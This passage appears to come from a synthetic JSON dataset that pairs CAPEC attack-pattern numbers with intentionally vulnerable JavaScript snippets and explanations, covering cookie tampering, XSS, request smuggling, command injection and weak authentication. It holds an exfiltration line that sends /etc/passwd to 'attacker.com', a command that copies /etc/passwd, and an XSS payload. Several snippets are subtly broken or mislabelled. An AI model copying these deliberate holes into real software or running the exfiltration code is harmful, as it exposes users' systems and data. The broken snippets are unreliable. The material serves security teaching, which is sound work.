        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.use(express.cookieParser());\n\napp.get('/', (req, res) => {\n  const username = req.cookies.username;\n  const role = req.cookies.role;\n  if (username && role) {\n    // No validation or integrity checking of the cookies\n    res.send(`Welcome, ${username}! You are a ${role}.`);\n  } else {\n    res.send('Please login.');\n  }\n});\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (username === 'admin' && password === 'password') {\n    res.cookie('username', username);\n    res.cookie('role', 'admin');\n    res.send('Login successful.');\n  } else {\n    res.send('Invalid credentials.');\n  }\n});",
        "description": "This code snippet demonstrates a vulnerable web application that relies on HTTP cookies to store sensitive information such as username and role. The application does not perform any validation or integrity checking on the cookies, making it vulnerable to attacks such as cookie tampering, session fixation, and authentication bypass. An attacker can intercept and modify the cookies to impersonate a user or gain unauthorized access."
    },
    {
        "capec_id": "32",
        "code_snippet": "var userInput = decodeURIComponent(getQueryStringParameter('userInput'));\n\nfunction getQueryStringParameter(param) {\n    var query = window.location.search.substring(1);\n    var vars = query.split('&');\n    for (var i = 0; i < vars.length; i++) {\n        var pair = vars[i].split('=');\n        if (pair[0] == param) {\n            return pair[1];\n        }\n    }\n    return null;\n}\n\ndocument.write('<div>' + userInput + '</div>');",
        "description": "This code snippet demonstrates a vulnerable JavaScript code that is susceptible to Cross-Site Scripting (XSS) attack. It retrieves a user-controlled input from the query string, decodes it, and then injects it into the HTML document using document.write(), without proper validation or encoding, allowing an attacker to inject malicious scripts."
    },
    {
        "capec_id": "33",
        "code_snippet": "const http = require('http');\nconst proxy = http.createServer((req, res) => {\n  const maliciousReq = http.request({\n    host: 'target-server.com',\n    port: 80,\n    method: 'GET',\n    path: '/admin/delete?user=all',\n    headers: {\n      'Transfer-Encoding': 'chunked',\n      'Content-Length': '0\\r\n',\n      'Connection': 'keep-alive',\n      'Proxy-Connection': 'keep-alive'\n    }\n  }, (response) => {\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Malicious request sent successfully!');\n  });\n  maliciousReq.write('0\\\\r\\\n\\\\r\\\n');\n  maliciousReq.end();\n});\nproxy.listen(8080, () => {\n  console.log('Proxy server listening on port 8080');\n});",
        "description": "This code snippet demonstrates HTTP Request Smuggling (CWE-444) and Server-Side Request Forgery (CWE-918) vulnerabilities. A malicious proxy server is set up to forward a crafted HTTP request to a target server, which can lead to unauthorized actions. The request is designed to bypass security controls by using inconsistent HTTP headers and chunked encoding. The proxy server also fails to verify the request's origin, making it vulnerable to Cross-Site Request Forgery (CWE-352) and Unintended Proxy or Intermediary (CWE-441) attacks. Additionally, the code does not properly neutralize CRLF sequences in HTTP headers, making it vulnerable to HTTP Request/Response Splitting (CWE-113)."
    },
    {
        "capec_id": "34",
        "code_snippet": "const http = require('http');\nconst express = require('express');\nconst app = express();\n\napp.get('/', (req, res) => {\n  const userInput = req.query.userInput;\n  const maliciousResponse = 'HTTP/1.1 200 OK\\r\\nContent-Length: 10\\r\\n\\r\\n<p>Injected Content</p>';\n  res.write(userInput);\n  res.write(maliciousResponse);\n  res.end();\n});\n\nhttp.createServer(app).listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "This code snippet demonstrates HTTP Response Splitting (CWE-113) and Injection (CWE-74) vulnerabilities. The express.js server takes user input and injects it into the HTTP response. An attacker can manipulate the userInput to inject malicious HTTP responses, which can lead to HTTP Request/Response Smuggling (CWE-444) and Interpretation Conflict (CWE-436) issues. The maliciousResponse variable contains a crafted HTTP response that can be injected into the original response, allowing an attacker to manipulate the HTTP traffic."
    },
    {
        "capec_id": "35",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// CWE-59: Improper Link Resolution Before File Access ('Link Following')\nconst configFile = './config.json';\nconst configData = fs.readFileSync(configFile, 'utf8');\n\n// CWE-94: Improper Control of Generation of Code ('Code Injection')\nconst config = JSON.parse(configData);\nconst { script } = config;\n\n// CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')\neval(script);\n\n// CWE-96: Improper Neutralization of Directives in Statically Saved Code ('Static Code Injection')\nconst template = fs.readFileSync('./template.html', 'utf8');\nconst output = template.replace('{{script}}', script);\nfs.writeFileSync('./output.html', output);\n\n// CWE-97: Improper Neutralization of Server-Side Includes (SSI) Within a Web Page\nconst ssiDirective = '<!--#include file=\"./ssi.inc\" -->';\nconst ssiOutput = fs.readFileSync('./ssi.inc', 'utf8');\nconst finalOutput = output.replace('{{ssi}}', ssiOutput);\nfs.writeFileSync('./finalOutput.html', finalOutput);\n\n// CWE-270: Privilege Context Switching Error\n// CWE-272: Least Privilege Violation\n// CWE-282: Improper Ownership Management\nprocess.setuid(0);\nfs.chmod('./finalOutput.html', 0o777);\n",
        "description": "This code snippet demonstrates a vulnerable JavaScript application that loads a configuration file, executes a script from the file, and generates an output HTML file with server-side includes. The code is vulnerable to code injection, static code injection, eval injection, and improper link resolution, leading to potential security risks."
    },
    {
        "capec_id": "36",
        "code_snippet": "const adminAPI = {\n\tdeleteUser: (username) => {\n\t\t// No authentication or authorization checks\n\t\tif (username) {\n\t\t\t// Delete user from database\n\t\t\tconsole.log(`Deleted user ${username}`);\n\t\t}\n\t},\n\tcreateAdmin: (username) => {\n\t\t// No authentication or authorization checks\n\t\tif (username) {\n\t\t\t// Create new admin user in database\n\t\t\tconsole.log(`Created new admin user ${username}`);\n\t\t}\n\t}\n};\n\n// Undocumented feature to create a new admin user\nadminAPI.createAdmin('newAdmin');\n\n// Missing authorization check to delete a user\nadminAPI.deleteUser('existingUser');",
        "description": "This code snippet demonstrates the CAPEC of invoking unintended interfaces or functionality. The adminAPI object has two methods, deleteUser and createAdmin, which do not perform any authentication or authorization checks. This allows an attacker to invoke these methods without proper credentials, potentially leading to unauthorized actions. The createAdmin method is an undocumented feature that can be exploited to create a new admin user. The deleteUser method lacks authorization checks, allowing an attacker to delete users without permission."
    },
    {
        "capec_id": "37",
        "code_snippet": "const sensitiveData = {\n  'apiKey': 'mySecretApiKey',\n  'creditCardNumber': '1234-5678-9012-3456',\n  'password': 'mySecretPassword'\n};\n\n// CWE-226: Sensitive Information in Resource Not Removed Before Reuse\nfunction releaseResource() {\n  // Not clearing sensitive data before reusing the resource\n  return sensitiveData;\n}\n\n// CWE-311: Missing Encryption of Sensitive Data\nfunction storeData() {\n  // Storing sensitive data in cleartext\n  localStorage.setItem('sensitiveData', JSON.stringify(sensitiveData));\n}\n\n// CWE-525: Use of Web Browser Cache Containing Sensitive Information\nfunction cacheData() {\n  // Not specifying a caching policy, allowing sensitive data to be cached\n  const cache = window.cache;\n  cache.setItem('sensitiveData', JSON.stringify(sensitiveData));\n}\n\n// CWE-312: Cleartext Storage of Sensitive Information\nfunction storeInRegistry() {\n  // Storing sensitive data in cleartext in the registry\n  const registry = require('registry');\n  registry.set('sensitiveData', JSON.stringify(sensitiveData));\n}\n\n// CWE-315: Cleartext Storage of Sensitive Information in a Cookie\nfunction storeInCookie() {\n  // Storing sensitive data in cleartext in a cookie\n  const cookie = 'sensitiveData=' + JSON.stringify(sensitiveData);\n  document.cookie = cookie;\n}",
        "description": "This code snippet demonstrates the CAPEC of examining a target system to find sensitive data that has been embedded within it. The code stores sensitive data such as API keys, credit card numbers, and passwords in cleartext, and then releases the resource without clearing the sensitive data, stores it in local storage without encryption, caches it without a caching policy, stores it in the registry and cookies in cleartext, and does not properly scrub the data when the device is decommissioned."
    },
    {
        "capec_id": "38",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nlet searchPath = process.env.PATH;\nlet maliciousComponent = 'malicious_script.js';\n\n// CWE-426: Untrusted Search Path\nsearchPath += ':' + '/tmp/';\nprocess.env.PATH = searchPath;\n\n// CWE-427: Uncontrolled Search Path Element\nlet componentPath = path.join('/tmp/', maliciousComponent);\nfs.writeFileSync(componentPath, 'console.log(\"Malicious component executed!\");');\n\n// CWE-73: External Control of File Name or Path\nlet userInput = 'malicious_input';\nlet dynamicPath = path.join('/tmp/', userInput);\nfs.writeFileSync(dynamicPath, 'console.log(\"Dynamic path created!\");');\n\n// CWE-555: J2EE Misconfiguration: Plaintext Password in Configuration File\nlet config = {\n  'password': 'plaintext_password'\n};\nfs.writeFileSync('config.json', JSON.stringify(config));\n\n// CWE-99: Improper Control of Resource Identifiers ('Resource Injection')\nlet resourceId = userInput;\nlet resourcePath = path.join('/tmp/', resourceId);\nfs.readFile(resourcePath, (err, data) => {\n  if (!err) {\n    console.log(`Resource ${resourceId} accessed!`);\n  }\n});",
        "description": "This code snippet demonstrates the CAPEC pattern of attack where an adversary loads a malicious resource into a program's standard path. It uses CWE-426 to modify the search path, CWE-427 to manipulate resources on the path, CWE-73 to control file names or paths, CWE-555 to store plaintext passwords in a configuration file, and CWE-99 to improperly control resource identifiers."
    },
    {
        "capec_id": "39",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.use(express.cookieParser());\n\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n  if (checkCredentials(username, password)) {\n    res.cookie('authToken', username, { expires: new Date(Date.now() + 900000), httpOnly: false });\n    res.cookie('role', 'admin', { expires: new Date(Date.now() + 900000), httpOnly: false });\n    res.redirect('/admin');\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\n\napp.get('/admin', (req, res) => {\n  const authToken = req.cookies.authToken;\n  const role = req.cookies.role;\n  if (authToken && role === 'admin') {\n    res.send('Welcome, admin!');\n  } else {\n    res.status(403).send('Access denied');\n  }\n});",
        "description": "This code snippet demonstrates a vulnerable authentication mechanism that relies on client-side cookies without proper validation and integrity checking (CWE-565). The 'authToken' and 'role' cookies are set without encryption or obfuscation, making them susceptible to tampering (CWE-315, CWE-539). An attacker can manipulate these cookies to bypass authentication and gain unauthorized access to the '/admin' page (CWE-302, CWE-472). The code also lacks proper authorization checks, allowing an attacker to access sensitive information (CWE-285). Additionally, the use of persistent cookies containing sensitive information and the lack of session fixation protection (CWE-384) further exacerbate the vulnerability."
    },
    {
        "capec_id": "40",
        "code_snippet": "const exec = require('child_process').exec;\nconst userInput = 'cp /etc/passwd /tmp/'; // user input from terminal device\nexec(userInput, (error, stdout, stderr) => {\n  if (error) {\n    console.error(`exec error: ${error}`);\n    return;\n  }\n  console.log(`stdout: ${stdout}`);\n  console.log(`stderr: ${stderr}`);\n});",
        "description": "This code snippet demonstrates a command injection vulnerability, where user input from a terminal device is directly executed as a system command without proper sanitization, allowing an attacker to inject malicious commands and execute them with the user's privileges."
    },
    {
        "capec_id": "41",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/', (req, res) => {\n  const userInput = req.headers['user-input'];\n  const script = `<script>alert('${userInput}');</script>`;\n  res.set('Content-Type', 'text/html');\n  res.send(script);\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable email application that fails to properly neutralize meta-characters in email headers, allowing an attacker to inject malicious scripts. The express.js server receives user input from the 'user-input' header and injects it into a script tag without proper escaping, making it vulnerable to XSS attacks (CWE-116). The script is then sent as a response to the client, which can lead to the execution of malicious code. Additionally, the code does not properly delimit the intended arguments in the script tag, making it vulnerable to argument injection (CWE-88). The comparison of the user input to the expected format is also incorrect, leading to resultant weaknesses (CWE-697). Furthermore, the code does not neutralize web scripting syntax in HTTP headers, making it vulnerable to attacks that can be used by web browser components (CWE-644). Finally, the code does not properly neutralize escape, meta, or control character sequences, making it vulnerable to improper neutralization of escape, meta, or control sequences (CWE-150)."
    },
    {
        "capec_id": "42",
        "code_snippet": "function convertToMime(userInput) {\n  var mimeBuffer = new Buffer(1024);\n  var userInputBuffer = new Buffer(userInput, 'utf8');\n  mimeBuffer.write(userInputBuffer, 0, userInputBuffer.length);\n  return mimeBuffer.toString('ascii');\n}\n\n// Example usage:\nvar userInput = 'A'.repeat(2048);\nvar mimeOutput = convertToMime(userInput);\nconsole.log(mimeOutput);",
        "description": "This code snippet demonstrates a vulnerable MIME conversion routine in JavaScript. The function `convertToMime` takes user input and copies it into a fixed-size buffer without checking the size of the input, leading to a buffer overflow (CWE-120). The function also does not validate the user input (CWE-20), allowing an attacker to inject malicious data. Additionally, the function relies on the file name or extension of the input file (CWE-646), which could be used to misclassify the file and process it in a dangerous fashion. The code also does not neutralize special elements in the output (CWE-74), making it vulnerable to injection attacks. Finally, the function performs operations on the memory buffer without checking the bounds (CWE-119), leading to potential memory corruption."
    },
    {
        "capec_id": "43",
        "code_snippet": "const userInput = \"\\\";alert('XSS');//\";\n\nfunction parser1(input) {\n  return input.replace(/\\\\/, '');\n}\n\nfunction inputValidator(input) {\n  if (input.indexOf('<') === -1 && input.indexOf('>') === -1) {\n    return true;\n  }\n  return false;\n}\n\nfunction parser2(input) {\n  return input.replace(/\\\"/, '<');\n}\n\nif (inputValidator(parser1(userInput))) {\n  console.log('Input is valid');\n  const result = parser2(parser1(userInput));\n  console.log(result);\n} else {\n  console.log('Input is invalid');\n}",
        "description": "This code snippet demonstrates the CAPEC of layering special characters to bypass input validation. The userInput is designed to pass through the inputValidator, but after passing through parser2, it will be converted into a malicious script that the inputValidator was supposed to stop. The CWEs embodied in this code snippet include CWE-179 (Incorrect Behavior Order: Early Validation), CWE-181 (Incorrect Behavior Order: Validate Before Filter), CWE-20 (Improper Input Validation), and CWE-74 (Improper Neutralization of Special Elements in Output Used by a Downstream Component)."
    },
    {
        "capec_id": "44",
        "code_snippet": "function loadImage(file) {\n  var img = document.createElement('img');\n  img.src = 'data:image/jpeg;base64,' + file;\n  var canvas = document.createElement('canvas');\n  var ctx = canvas.getContext('2d');\n  ctx.drawImage(img, 0, 0);\n  var imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);\n  var pixels = imageData.data;\n  var buffer = new ArrayBuffer(pixels.length);\n  var uint8Array = new Uint8Array(buffer);\n  for (var i = 0; i < pixels.length; i++) {\n    uint8Array[i] = pixels[i];\n  }\n  // Vulnerable code: no size check before copying\n  var outputBuffer = new ArrayBuffer(1024);\n  var outputUint8Array = new Uint8Array(outputBuffer);\n  for (var j = 0; j < uint8Array.length; j++) {\n    outputUint8Array[j] = uint8Array[j];\n  }\n  // Potential for arbitrary code execution\n  eval(String.fromCharCode.apply(null, outputUint8Array));\n}\n",
        "description": "This code snippet demonstrates a buffer overflow vulnerability in the handling of binary resources, specifically image files. The loadImage function takes a file as input, processes it, and stores the pixel data in a buffer. The vulnerable part is when the code copies the pixel data to an output buffer without checking the size of the input buffer, leading to a buffer overflow. This can allow an attacker to execute arbitrary code in the target process. The code also relies on the file name and extension to determine the appropriate behavior, which can be exploited by an attacker to cause the file to be misclassified and processed in a dangerous fashion."
    },
    {
        "capec_id": "45",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction processSymlink(symlinkPath) {\n    const symlinkBuffer = fs.readFileSync(symlinkPath);\n    const targetBuffer = Buffer.alloc(1024);\n    fs.readlink(symlinkBuffer, (err, linkString) => {\n        if (!err) {\n            fs.readFile(linkString, (err, fileBuffer) => {\n                if (!err) {\n                    targetBuffer.write(fileBuffer, 0, fileBuffer.length);\n                    // No bounds checking on targetBuffer\n                    console.log(targetBuffer.toString());\n                }\n            });\n        }\n    });\n}\n\n// Create a symbolic link with a large file\nfs.symlink('large_file.txt', 'symlink_file', (err) => {\n    if (!err) {\n        processSymlink('symlink_file');\n    }\n});",
        "description": "This JavaScript code snippet demonstrates a buffer overflow vulnerability when processing symbolic links. The `processSymlink` function reads the contents of a symbolic link and writes it to a fixed-size buffer without checking the size of the input. An attacker can create a symbolic link to a large file, causing a buffer overflow when the `processSymlink` function processes the link. The code also lacks proper authorization checks, allowing an attacker to manipulate the symbolic link file. CWEs: 120, 285, 302, 118, 119, 74, 20, 680, 697."
    },
    {
        "capec_id": "46",
        "code_snippet": "function parseConfig(config) {\n  var buffer = new Buffer(1024);\n  var configData = config.split('\\n');\n  for (var i = 0; i < configData.length; i++) {\n    var keyValue = configData[i].split('=');\n    var key = keyValue[0];\n    var value = keyValue[1];\n    if (value.length > 1024) {\n      // CWE-20: Improper Input Validation\n      // CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component\n      // CWE-680: Integer Overflow to Buffer Overflow\n      buffer.write(key + '=' + value, 0);\n    } else {\n      buffer.write(key + '=' + value, buffer.length);\n    }\n  }\n  return buffer.toString();\n}\n\n// CWE-118: Incorrect Access of Indexable Resource ('Range Error')\n// CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer\n// CWE-120: Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')\nvar config = 'key1=value1\\nkey2=value2\\nkey3=' + Array(1025).join('A');\nparseConfig(config);",
        "description": "This code snippet demonstrates a buffer overflow vulnerability in a configuration parser. The parser does not validate the size of the input data, leading to a buffer overflow when a large string is provided. The code also includes several CWEs, including improper input validation, improper neutralization of special elements, and incorrect access of indexable resources."
    },
    {
        "capec_id": "47",
        "code_snippet": "function processInput(input) {\n  var buffer = new Buffer(1024);\n  var len = input.length;\n  if (len > 0) {\n    buffer.write(input, 0, len);\n  }\n  return buffer;\n}\n\nvar userInput = 'A'.repeat(2048);\nprocessInput(userInput);",
        "description": "This JavaScript code snippet demonstrates a buffer overflow vulnerability. The function processInput() takes an input string and writes it to a buffer of fixed size (1024 bytes). However, it does not check the length of the input string before writing it to the buffer, leading to a buffer overflow when the input string is larger than the buffer size. This is an example of CWE-120: Buffer Copy without Checking Size of Input ('Classic Buffer Overflow'). The userInput variable is intentionally set to a large string to trigger the buffer overflow."
    },
    {
        "capec_id": "48",
        "code_snippet": "const xhr = new XMLHttpRequest();\nxhr.open('GET', 'file:///etc/passwd', true);\nxhr.onload = function() {\n  if (xhr.status === 200) {\n    const result = xhr.responseText;\n    const maliciousUrl = 'http://attacker.com/steal?data=' + encodeURIComponent(result);\n    const img = document.createElement('img');\n    img.src = maliciousUrl;\n    document.body.appendChild(img);\n  }\n};\nxhr.send();",
        "description": "JavaScript code snippet that demonstrates a local file inclusion vulnerability, where an attacker can access local files and resources instead of URLs, and send the results to a malicious site. This code uses XMLHttpRequest to access the local file:///etc/passwd file, and then sends the contents to a malicious site using an img tag."
    },
    {
        "capec_id": "49",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst users = {\n  'admin': 'password123',\n  'user': 'ilovecats'\n};\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (users[username] === password) {\n    res.send('Login successful!');\n  } else {\n    res.send('Invalid username or password.');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable login system that is susceptible to brute force attacks. The passwords are stored in a recoverable format ( CWE-257 ) and there is no mechanism to prevent excessive authentication attempts ( CWE-307 ). The system also relies on a single factor (password) for authentication ( CWE-308, CWE-309 ) and does not require strong passwords ( CWE-521 ). Additionally, there is no password aging mechanism in place ( CWE-262, CWE-263 ). An attacker can use a brute force attack to try all possible passwords until they succeed in logging in."
    },
    {
        "capec_id": "50",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst passwordRecovery = (username) => {\n  const user = getUserByUsername(username);\n  if (user) {\n    const recoveryToken = generateRandomToken();\n    sendRecoveryEmail(username, recoveryToken);\n    storeRecoveryTokenInPlaintext(username, recoveryToken);\n  }\n};\napp.post('/forgot-password', (req, res) => {\n  const username = req.body.username;\n  passwordRecovery(username);\n  res.send('Password recovery email sent.');\n});\n\nconst generateRandomToken = () => {\n  return Math.floor(Math.random() * 1000000);\n};\n\nconst storeRecoveryTokenInPlaintext = (username, token) => {\n  // Store token in plaintext in the database\n  db.query(`UPDATE users SET recovery_token = '${token}' WHERE username = '${username}');\n};",
        "description": "This code snippet demonstrates a weak password recovery mechanism. When a user requests a password reset, a random recovery token is generated and sent to the user's email. The token is stored in plaintext in the database, making it susceptible to unauthorized retrieval (CWE-522). The mechanism is weak and insecure, allowing an attacker to potentially gain access to the system with the same privileges as the original user (CAPEC). The code also stores passwords in a recoverable format (CWE-257) and has weak password requirements (CWE-521). The use of password systems as the primary means of authentication is also flawed (CWE-309)."
    },
    {
        "capec_id": "51",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst registry = {\n  'service1': 'http://malicious-service.com/service1',\n  'service2': 'http://malicious-service.com/service2'\n};\n\napp.get('/registry', (req, res) => {\n  res.json(registry);\n});\n\napp.get('/wsdl', (req, res) => {\n  const wsdl = `<?xml version='1.0' encoding='UTF-8'?><definitions xmlns:http='http://schemas.xmlsoap.org/wsdl/http/' xmlns:soap='http://schemas.xmlsoap.org/wsdl/soap/' xmlns:xs='http://www.w3.org/2001/XMLSchema' xmlns='http://schemas.xmlsoap.org/wsdl/' targetNamespace='http://malicious-service.com'>\n    <service name='MaliciousService'>\n      <port name='MaliciousPort' binding='tns:MaliciousBinding'>\n        <soap:address location='http://malicious-service.com/MaliciousPort'/>\n      </port>\n    </service>\n  </definitions>`;\n  res.set('Content-Type', 'text/xml');\n  res.send(wsdl);\n});\n\napp.listen(3000, () => {\n  console.log('Malicious registry and WSDL server listening on port 3000');\n});",
        "description": "This code snippet demonstrates a poisoned registry that redirects service requesters to malicious services and exposes sensitive information in the WSDL file. The registry is stored in cleartext and does not perform authorization checks, allowing unauthorized access to the registry. The WSDL file contains information on the malicious services and how callers should interact with them, making it vulnerable to attacks."
    },
    {
        "capec_id": "52",
        "code_snippet": "const userInput = 'Hello\\0World';\nconst buffer = new Buffer(userInput, 'utf8');\nconst fs = require('fs');\nfs.writeFileSync('output.txt', buffer);\nconst exec = require('child_process').exec;\nconst command = 'cat output.txt';\nexec(command, (error, stdout, stderr) => {\n  if (error) {\n    console.error(`exec error: ${error}`);\n    return;\n  }\n  console.log(`stdout: ${stdout}`);\n});",
        "description": "This code snippet demonstrates a vulnerability to null byte injection. The userInput variable contains a null byte (\\0) which, when written to a file and then executed as a command, can cause the command to be truncated, potentially leading to unintended behavior or code execution. The code fails to properly validate and neutralize the null byte, making it vulnerable to CWE-158, CWE-172, CWE-173, CWE-74, CWE-20, CWE-697, and CWE-707."
    },
    {
        "capec_id": "53",
        "code_snippet": "const userInput = 'path/to/directory\u0000evil_input';\nconst filteredInput = userInput.replace(//$/, '');\nconst fs = require('fs');\nfs.readdir(filteredInput, (err, files) => {\n  console.log(files);\n});",
        "description": "This code snippet demonstrates the CAPEC where a filter is bypassed by using an alternate representation of NULL. The userInput variable contains a path with a NULL byte (\u0000) followed by malicious input. The filteredInput variable is created by removing the trailing slash from the userInput, but the NULL byte is not properly neutralized. This allows the malicious input to be injected into the fs.readdir function, potentially leading to unauthorized access to the file system."
    },
    {
        "capec_id": "54",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst mysql = require('mysql');\n\nconst db = mysql.createConnection({\n  host: 'localhost',\n  user: 'root',\n  password: 'password',\n  database: 'mydb'\n});\n\napp.get('/users', (req, res) => {\n  const query = 'SELECT * FROM users WHERE name LIKE \\'%' + req.query.name + '%\\';';\n  db.query(query, (err, rows) => {\n    if (err) {\n      res.status(500).send({ error: err.message });\n    } else {\n      res.send(rows);\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable web application that is susceptible to SQL injection attacks. The application uses the HTTP GET method to process a request and includes sensitive information in the query string. The query string is not properly sanitized, allowing an attacker to inject malicious SQL code. Additionally, the application generates an error message that includes sensitive information about the database environment. An attacker can use this information to infer sensitive data or exploit the SQL injection vulnerability."
    },
    {
        "capec_id": "55",
        "code_snippet": "const users = {\n  'user1': '5f4dcc3b5aa765d61d8327deb882cf99', // md5 hash of 'password123'\n  'user2': 'e10adc3949ba59abbe56e057f20f883e', // md5 hash of 'iloveyou'\n  'user3': '5baa61e4c9b93f3f0682250b6cf8331b7', // md5 hash of 'password123'\n};\n\nfunction authenticate(username, password) {\n  const storedHash = users[username];\n  if (storedHash) {\n    const hash = md5(password);\n    if (hash === storedHash) {\n      return true;\n    }\n  }\n  return false;\n}\n\nfunction md5(password) {\n  // simple md5 implementation, not secure\n  const passwordBytes = new TextEncoder('utf-8').encode(password);\n  const hashBytes = crypto.createHash('md5').update(passwordBytes).digest();\n  return Array.prototype.map.call(hashBytes, byte => ('00' + byte.toString(16)).slice(-2)).join('');\n}",
        "description": "This code snippet demonstrates a vulnerable password authentication system that uses a simple MD5 hash to store passwords. The system does not enforce strong password requirements, does not use password aging, and relies on a single factor for authentication. An attacker can use a rainbow table to look up the original password corresponding to the stored hash, and then use the original password to gain access to the system."
    },
    {
        "capec_id": "56",
        "code_snippet": "function authenticateUser(username, password) {\n  // Client-side authentication mechanism\n  if (username === 'admin' && password === 'password') {\n    return true;\n  } else {\n    return false;\n  }\n}\n\n// Compiler optimization removal of security-critical code\nfunction checkAccess() {\n  // Removed security check due to compiler optimization\n  // if (!authenticateUser(username, password)) {\n  //   return 'Access denied';\n  // }\n  return 'Access granted';\n}\n\n// Client-side enforcement of server-side security\nfunction sendDataToServer(data) {\n  // Relying on client-side authentication mechanism\n  if (checkAccess() === 'Access granted') {\n    // Send data to server without proper authentication\n    fetch('/api/data', {\n      method: 'POST',\n      body: JSON.stringify(data)\n    });\n  }\n}",
        "description": "This code snippet demonstrates the deprecated CAPEC pattern of removing important client functionality, which can lead to authentication bypass issues. The code includes a client-side authentication mechanism that can be easily bypassed, and a compiler optimization that removes a security-critical check. Additionally, the code relies on client-side enforcement of server-side security, which can be exploited by an attacker. This code is vulnerable to capture-replay attacks and protection mechanism failures."
    },
    {
        "capec_id": "57",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/api/data', (req, res) => {\n  const username = req.query.username;\n  const password = req.query.password;\n  const userData = getUserData(username, password);\n  res.json(userData);\n});\n\nfunction getUserData(username, password) {\n  // No authentication or verification of the username and password\n  // Directly return sensitive user data\n  return { username: username, password: password, email: 'user@example.com' };\n}",
        "description": "This code snippet demonstrates a RESTful API that uses the GET method to retrieve sensitive user data, including the username and password, without proper authentication or verification. The sensitive data is passed as query string parameters, making it accessible to unauthorized actors. The API also fails to ensure the integrity of the communication channel, allowing an attacker to intercept and access the sensitive data."
    },
    {
        "capec_id": "58",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/users', (req, res) => {\n  // No authentication or authorization checks\n  const userId = req.query.userId;\n  const userData = getUserData(userId);\n  res.json(userData);\n});\n\napp.put('/users', (req, res) => {\n  // No authentication or authorization checks\n  const userId = req.query.userId;\n  const userData = req.body;\n  updateUser(userId, userData);\n  res.json({ message: 'User updated successfully' });\n});\n\napp.delete('/users', (req, res) => {\n  // No authentication or authorization checks\n  const userId = req.query.userId;\n  deleteUser(userId);\n  res.json({ message: 'User deleted successfully' });\n});",
        "description": "This code snippet demonstrates a vulnerable RESTful API that lacks proper access control mechanisms, allowing an adversary to perform malicious actions such as reading, modifying, or deleting user data without authentication or authorization checks."
    },
    {
        "capec_id": "59",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.use(express.cookieParser());\n\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n  if (checkCredentials(username, password)) {\n    const sessionId = generateSessionId(); // CWE-330, CWE-331: Insufficiently random session ID\n    res.cookie('sessionId', sessionId, { httpOnly: true });\n    res.send('Login successful');\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\n\napp.get('/protected', (req, res) => {\n  const sessionId = req.cookies.sessionId;\n  if (sessionId) {\n    // CWE-290: Authentication Bypass by Spoofing\n    // CWE-346: Origin Validation Error\n    // CWE-488: Exposure of Data Element to Wrong Session\n    // CWE-539: Use of Persistent Cookies Containing Sensitive Information\n    // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n    // CWE-6: J2EE Misconfiguration: Insufficient Session-ID Length\n    // CWE-285: Improper Authorization\n    // CWE-384: Session Fixation\n    // CWE-693: Protection Mechanism Failure\n    res.send('Welcome, authenticated user!');\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});\n\nfunction generateSessionId() {\n  // CWE-330, CWE-331: Insufficiently random session ID\n  return Math.floor(Math.random() * 1000000).toString();\n}\n\nfunction checkCredentials(username, password) {\n  // CWE-285: Improper Authorization\n  // CWE-693: Protection Mechanism Failure\n  return true; // Always allow login for demonstration purposes\n}",
        "description": "This code snippet demonstrates a vulnerable session management system in a Node.js Express application. The generateSessionId function uses an insufficiently random value, making it predictable and vulnerable to spoofing and session hijacking attacks. The checkCredentials function always allows login, demonstrating improper authorization. The application uses persistent cookies containing sensitive information and does not properly verify the source of data or communication, leading to exposure of sensitive information to unauthorized actors."
    },
    {
        "capec_id": "60",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst session = require('express-session');\n\napp.use(session({\n  secret: 'secret',\n  resave: false,\n  saveUninitialized: true,\n  cookie: { secure: false }\n}));\n\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n  if (checkCredentials(username, password)) {\n    req.session.username = username;\n    res.send('Logged in successfully');\n  } else {\n    res.send('Invalid credentials');\n  }\n});\n\napp.get('/protected', (req, res) => {\n  if (req.session.username) {\n    res.send(`Welcome, ${req.session.username}!`);\n  } else {\n    res.send('You are not logged in');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});\n\nfunction checkCredentials(username, password) {\n  // Insecurely store credentials in a dictionary\n  const users = {\n    'user1': 'password1',\n    'user2': 'password2'\n  };\n  return users[username] === password;\n}",
